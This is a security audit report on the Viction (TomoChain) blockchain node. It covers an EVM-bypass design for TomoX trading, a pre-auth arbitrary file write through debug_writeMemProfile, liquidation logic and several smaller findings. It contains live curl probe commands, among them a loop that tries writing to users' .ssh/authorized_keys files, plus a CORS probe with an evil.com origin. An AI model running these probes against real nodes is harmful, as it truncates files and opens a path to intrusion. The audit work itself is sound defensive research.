# Viction (TomoChain) Node Audit — 2026-08-16

**Target:** https://github.com/buildonviction + https://viction.xyz
**Repos:** `buildonviction/tomochain` (455MB Go), `buildonviction/viction-contracts` (Solidity 0.4.24)
**Chain ID:** 88 (mainnet), 89 (testnet)
**Consensus:** Proof-of-Stake-Voting (PoSV) — 150 masternodes

---

## CRITICAL: Node-Contract EVM Bypass Pattern

The most significant finding from the Viction node audit is that **TomoX trading and lending transactions bypass EVM execution entirely**. The node directly manipulates contract storage slots without running contract bytecode.

### How It Works

**`core/state_processor.go:264-280`** — Special transaction routing:

```go
if tx.To() != nil && tx.To().String() == common.TradingStateAddr && config.IsTomoXEnabled(header.Number) {
    return ApplyEmptyTransaction(config, statedb, header, tx, usedGas)
}
if tx.To() != nil && tx.To().String() == common.TomoXLendingAddress && config.IsTomoXEnabled(header.Number) {
    return ApplyEmptyTransaction(config, statedb, header, tx, usedGas)
}
if tx.IsTradingTransaction() && config.IsTomoXEnabled(header.Number) {
    return ApplyEmptyTransaction(config, statedb, header, tx, usedGas)
}
if tx.IsLendingFinalizedTradeTransaction() && config.IsTomoXEnabled(header.Number) {
    return ApplyEmptyTransaction(config, statedb, header, tx, usedGas)
}
```

**`core/state_processor.go:531-553`** — `ApplyEmptyTransaction()` does NOT execute EVM:
- Sets receipt with `GasUsed = 0`
- Adds an empty log entry
- Returns success without running any contract code

### Direct Storage Access Functions

**`tomox/tradingstate/relayer_state.go`** — Node reads/writes contract storage directly:

```go
func GetExRelayerFee(relayer common.Address, statedb *state.StateDB) *big.Int {
    slot := RelayerMappingSlot["RELAYER_LIST"]
    locBig := GetLocMappingAtKey(relayer.Hash(), slot)
    locBig = new(big.Int).Add(locBig, RelayerStructMappingSlot["_fee"])
    locHash := common.BigToHash(locBig)
    return statedb.GetState(common.HexToAddress(common.RelayerRegistrationSMC), locHash).Big()
}

func SubRelayerFee(relayer common.Address, fee *big.Int, statedb *state.StateDB) error {
    // ... calculates storage slot ...
    balance = new(big.Int).Sub(balance, fee)
    statedb.SetState(common.HexToAddress(common.RelayerRegistrationSMC), locHashDeposit, common.BigToHash(balance))
    statedb.SubBalance(common.HexToAddress(common.RelayerRegistrationSMC), fee)
}
```

### Impact

- **Bypasses Solidity modifiers** (`onlyActiveRelayer`, `relayerOwnerOnly`, `notForSale`)
- **Validator can manipulate** relayer fees, user balances, order matching
- **Liquidation logic runs entirely in node code** — no contract verification
- **State root validation is circular** — both `gotRoot` and `expectRoot` come from same node implementation

### System Contract Addresses (Hardcoded)

```go
// common/types.go
TomoXAddr                   = "0x0000000000000000000000000000000000000091"
TradingStateAddr            = "0x0000000000000000000000000000000000000092"
TomoXLendingAddress         = "0x0000000000000000000000000000000000000093"
```

---

## Trust Graph

| Boundary | Ingress | Gate | Sink |
|----------|---------|------|------|
| JSON-RPC HTTP/WS | `:8545`/`:8546` JSON-RPC 2.0 | `HTTPModules` whitelist + CORS + VHost | `internal/debug/*`, `eth/*`, `personal/*`, `admin/*` |
| P2P devp2p | `:30303` rlpx/discv5 | `p2p.Config{MaxPeers, TrustedNodes}` | `core.BlockChain.InsertChain`, `posv` consensus |
| TomoX DEX | `--tomox.db.connection-url` CLI flag | MongoDB connection string auth | `tomoxDAO.MongoDatabase` — order book, trades, lending |
| Node config/CLI | `tomo --config TOML` + `--rpcapi` flags | `cmd/tomo/config.go:defaultNodeConfig` | module exposure flag |
| Ethstats WS | `--ethstats nodename:secret@host:port` | Regex parse, no TLS verify | `ethstats.Service` — node info leak |
| **TomoX Trading** | **TradingStateAddr tx** | **None (bypasses EVM)** | **Direct storage write** |
| **Lending** | **TomoXLendingAddress tx** | **None (bypasses EVM)** | **Direct storage write** |

---

## Critical Finding: Debug API Arbitrary File Write

**VULNERABILITY:** `debug_writeMemProfile` → arbitrary file create (pre-auth if `debug` in `HTTPModules`)

**ENTRY:** Pre-auth (unauthenticated RPC call)

**CHAIN:**
```
HTTP POST / → {"method":"debug_writeMemProfile","params":["/tmp/pwned"]}
    ↓
rpc/server.go: serveRequest → no auth middleware
    ↓
internal/debug/api.go: WriteMemProfile(file) → writeProfile("heap", file)
    ↓
os.Create(expandHome(file)) → pprof.WriteHeapProfile(f)
    ↓
File written to attacker-controlled path (pprof binary content)
    ↓
Escalation: write to crontab / authorized_keys / startup script → RCE
```

**Evidence:**
- `/tmp/victionchain-master/internal/debug/api.go:104,161,181,188,213` — `os.Create(expandHome(file))` via `writeProfile(name,file)`
- `/tmp/victionchain-master/rpc/server.go` — RPC server with no auth middleware
- `/tmp/victionchain-master/cmd/tomo/testdata/config.toml` — Default exposes `personal,db,eth,net,web3,txpool,miner` (debug not in default but easily added)

**Content control:** pprof writes binary profile data — attacker controls PATH, not content. This is arbitrary file create/truncate + DoS, NOT full RCE. Need second link (writable exec path) to achieve arbitrary content write.

**Severity:** HIGH arbitrary file write + info leak. RCE only if node runs as root (cron write) or datadir is world-writable.

**Live probe recipe:**
```bash
# 1. Check modules
curl -s -X POST <RPC> -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}'

# 2. Test file write to /tmp
curl -s -X POST <RPC> -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile","params":["/tmp/pwned"],"id":1}'
# result:null = SUCCESS

# 3. Probe user home
for u in ubuntu geth tomo root admin; do
  curl -s -X POST <RPC> -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"debug_writeMemProfile\",\"params\":[\"/home/$u/.ssh/authorized_keys\"],\"id\":1}"
done
# "permission denied" = no write access
# "no such file or directory" = user doesn't exist
```

---

## Liquidation Triggering Mechanism

**`tomoxlending/tomoxlending.go:830-954`** — `ProcessLiquidationData()`

Called at fixed intervals:
```go
// common/constants.go
LiquidateLendingTradeBlock = uint64(100)  // Every 100 blocks
```

**`miner/worker.go:707-713`** — Miner triggers liquidation:
```go
if header.Number.Uint64()%self.config.Posv.Epoch == common.LiquidateLendingTradeBlock {
    updatedTrades, liquidatedTrades, autoRepayTrades, autoTopUpTrades, autoRecallTrades, err = 
        tomoXLending.ProcessLiquidationData(header, self.chain, work.state, work.tradingState, work.lendingState)
}
```

### Liquidation Types
1. **Time-based liquidation** — Trades past their term are auto-repaid or liquidated
2. **Price-based liquidation** — When collateral price drops below `liquidationRate` threshold
3. **Auto top-up** — If `trade.AutoTopUp == true`, node attempts to add collateral instead of liquidating
4. **Auto recall** — When price recovers, node reduces collateral

### Post-Liquidation
The node creates a special "finalized trade" transaction:
```go
// miner/worker.go:765-783
finalizedTradeData, err := lendingstate.EncodeFinalizedResult(liquidatedTrades, autoRepayTrades, autoTopUpTrades, autoRecallTrades)
finalizedTx := types.NewTransaction(nonce, common.HexToAddress(common.TomoXLendingFinalizedTradeAddress), ...)
```

---

## Validation Mechanisms

### Block Validation (Re-execution)
**`core/block_validator.go:108-142`** — `ValidateTradingOrder()`:
- Re-executes `tomoXService.ApplyOrder()` for each order in the batch
- Compares results against the block's state root

**`core/block_validator.go:144-177`** — `ValidateLendingOrder()`:
- Re-executes `lendingService.ApplyOrder()` for each lending item
- Same re-execution pattern

### Token Validation
**`core/token_validator.go:118-130`** — `ValidateTomoXApplyTransaction()`:
- Validates that token contract balance is at storage slot 0
- Validates token decimal is accessible via ABI
- Uses random balance injection to verify slot mapping

### Critical Gap
Validation is **re-execution by another validator**, not verification against actual contract code. If all validators run the same buggy/malicious code, incorrect state transitions are accepted.

---

## Supporting Findings

### Finding 1: Dockerfile Secret Exposure

**File:** `Dockerfile.node`

```dockerfile
ENV WS_SECRET ''
ENV PASSWORD ''
ENV PRIVATE_KEY ''
```

**Impact:** Deployment configs may leak secrets via `docker inspect` or environment variable inheritance. Operators copying the Dockerfile without overriding these env vars expose empty-but-present secret placeholders.

### Finding 2: Hardcoded System Contract Addresses

**File:** `common/constants.go`

```go
RelayerRegistrationSMC = "0x16c63b79f9C8784168103C0b74E6A59EC2de4a02"
LendingRegistrationSMC = "0x7d761afd7ff65a79e4173897594a194e3c506e57"
TRC21IssuerSMC = HexToAddress("0x8c0faeb5C6bEd2129b8674F262Fd45c4e9468bee")
TomoXListingSMC = HexToAddress("0xDE34dD0f536170993E8CFF639DdFfCF1A85D3E53")
```

**Impact:** Hardcoded addresses prevent upgrade flexibility. If private keys lost, contracts become immutable. No proxy pattern for system contracts.

### Finding 3: Hardcoded Blacklist (60+ addresses)

**File:** `common/constants.go`

```go
var Blacklist = map[Address]bool{
    HexToAddress("0x5248bfb72fd4f234e062d3e9bb76f08643004fcd"): true,
    // ... 60+ more addresses
}
```

**Impact:** Censorship at protocol level. Addresses blacklisted in `core/state_processor.go:108,207`, `core/lending_pool.go:627`, `core/order_pool.go:535` — transactions from/to blacklisted addresses rejected at state processing. No governance mechanism for adding/removing.

### Finding 4: Ethstats WebSocket Secret

**File:** `ethstats/ethstats.go`

```go
re := regexp.MustCompile("([^:@]*)(:([^@]*))?@(.+)")
// Format: nodename:secret@host:port
```

**Impact:** If `WS_SECRET` leaked, attacker can impersonate node on ethstats server. Secret transmitted as part of URL string.

### Finding 5: TomoX MongoDB Connection via CLI

**File:** `tomox/tomox.go`

```go
type Config struct {
    DBEngine       string
    DBName         string
    ConnectionUrl  string  // MongoDB connection string
    ReplicaSetName string
}
```

**Impact:** MongoDB connection via CLI flag. If unauthenticated MongoDB exposed, order book data (orders, trades, lending items) leakable.

### Finding 6: BlockSigner No Auth (Solidity)

**File:** `viction-contracts-master/BlockSigner/BlockSigner.sol`

```solidity
function sign(uint256 _blockNumber, bytes32 _blockHash) external {
    // consensus should validate all senders are validators, gas = 0
    require(block.number >= _blockNumber);
    require(block.number <= _blockNumber.add(epochNumber * 2));
    blocks[_blockNumber].push(_blockHash);
    blockSigners[_blockHash].push(msg.sender);
}
```

**Impact:** Anyone can call `sign()` — relies on consensus layer to validate sender. `gas = 0` means no economic barrier to spam.

### Finding 7: TomoRandomize Timing Constraints

**File:** `viction-contracts-master/Randomize/TomoRandomize.sol`

```solidity
function setSecret(bytes32[] _secret) public {
    uint secretPoint = block.number % 900;
    require(secretPoint >= 800);
    require(secretPoint < 850);
    randomSecret[msg.sender] = _secret;
}
```

**Impact:** Validators must submit secrets in specific block window (800-850 of 900-block epoch). Timing manipulation possible if attacker controls block production.

---

## Web2 Surface

### Subdomains Discovered

| Subdomain | Status | Tech | Notes |
|-----------|--------|------|-------|
| blog.viction.xyz | 200 | GitBook | Static content |
| docs.viction.xyz | 200 | GitBook | Documentation |
| gov.viction.xyz | 200 | Next.js | Governance (Trezor connect) |
| stats.viction.xyz | 200 | AngularJS | Network stats (WebSocket to RPC) |
| horizon.viction.xyz | 200 | Framer | Hackathon site |
| forum.viction.xyz | 403 | Cloudflare | Blocked |
| vicscan.xyz | 403 | Cloudflare | Block explorer (CF protected) |

### viction.xyz Frontend

- Static React app on Amazon S3 + CloudFront
- No server-side APIs in frontend bundle
- Connects to external RPC endpoints (`http://horizon.viction.xyz/`)
- JS bundle strings reveal: `http://horizon.viction.xyz/` (HTTP, not HTTPS — potential MitM)

---

## Repos Discovered

| Repository | Language | Size | Description |
|------------|----------|------|-------------|
| buildonviction/tomochain | Go | 455MB | Viction blockchain node (v2.6.0) |
| buildonviction/vic-geth | Go | 20MB | Alternative geth fork |
| buildonviction/viction-contracts | Solidity | 356KB | System contracts |
| buildonviction/vrc25 | TypeScript | 120KB | VRC25 token standard |

---

## Geth-Fork TomoX Pattern (Viction 2026-08)

Orderbook DEX as go-ethereum fork extensions:
- `consensus/posv/` — Proof-of-Stake-Voting consensus
- `tomox/` — Trading engine (matching, settlement, order processing)
- `tomoxlending/` — Lending engine (lending items, trades, liquidation)
- `tomoxDAO/` — MongoDB + LevelDB data access layer
- `contracts/` — Solidity 0.4.24 relayer contracts

**Key sinks:**
- `order_processor.go` — matching engine (division by zero on `makerPrice==0`)
- `lending/processOrderList` — liquidationRate overflow → mass liquidation
- `tradingstate DB` — nonce wrap at 2^64
- `Registration.refund/buyRelayer` — reentrancy
- `LendingRegistration` — issuer-controlled collateral pricing
- `chequebook` — `selfdestruct` penalty

---

## Tarball Fallback Recipe (Broken git-remote-https)

When `git-remote-https` is missing (TencentOS 4 / minimal Linux):

```bash
# Instead of: git clone --depth 1 https://github.com/org/repo.git
curl -sL --max-time 180 "https://github.com/org/repo/archive/refs/heads/master.tar.gz" -o /tmp/repo.tar.gz
# Fallback to main branch:
curl -sL --max-time 180 "https://github.com/org/repo/archive/refs/heads/main.tar.gz" -o /tmp/repo.tar.gz
# Extract:
cd /tmp && tar xzf repo.tar.gz
# Per-file fallback (when API rate-limited):
curl -s "https://raw.githubusercontent.com/org/repo/master/path/to/file.go"
```

---

## Verification Matrix

```bash
# Clean install → build → probe
cd /tmp/victionchain-master
go run build/ci.go install
./build/bin/tomo --datadir /tmp/victest --http --http.addr 127.0.0.1 \
  --http.port 8545 --http.api eth,debug,net,admin --http.corsdomain "*" \
  --http.vhosts "*" &
sleep 6

# Probe debug file write
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile","params":["/tmp/vic_verify"],"id":1}' \
  http://127.0.0.1:8545 | jq .
ls -lh /tmp/vic_verify && echo WRITE_PROVEN

# Probe CORS
curl -s -i -X POST -H "Content-Type: application/json" \
  -H "Origin: http://evil.com" \
  -d '{"jsonrpc":"2.0","method":"debug_writeMemProfile","params":["/tmp/cors_test"],"id":1}' \
  http://127.0.0.1:8545 | grep -i access-control

# Cleanup
pkill -f "victest.*tomo"; rm /tmp/vic_verify /tmp/cors_test
```

---

## Pitfalls

- **`debug_write*` content is pprof binary, not attacker string** — classify as HIGH file-write/DoS, RCE only if writable cron/ssh/systemd and node as root or world-writable datadir
- **Code-level `debug` exposure ≠ live exposure** — always live-probe `rpc_modules` before claiming
- **TomoX MongoDB is optional** — default is LevelDB; MongoDB only enabled via `--tomox.db.engine mongodb`
- **BlockSigner `sign()` gas=0** — no economic barrier, but consensus layer validates sender; don't claim "unauth write" without consensus bypass
- **Hardcoded blacklist is deliberate** — protocol-level censorship feature, not a bug per se; report as architecture finding
- **`horizon.viction.xyz` uses HTTP** — potential MitM for frontend→RPC communication
- **Node-contract bypass is by design** — TomoX was built as a Layer 2 DEX on top of Ethereum; the "contracts" are legacy Solidity wrappers, the real logic is in Go node code. Audit the node, not the contracts.

---

## References

- `/tmp/victionchain-master/` — Full node source (455MB)
- `/tmp/viction-contracts-master/` — System contracts
- `/root/node-contract-audit-report.md` — Node-contract integration audit report (2026-08-16)
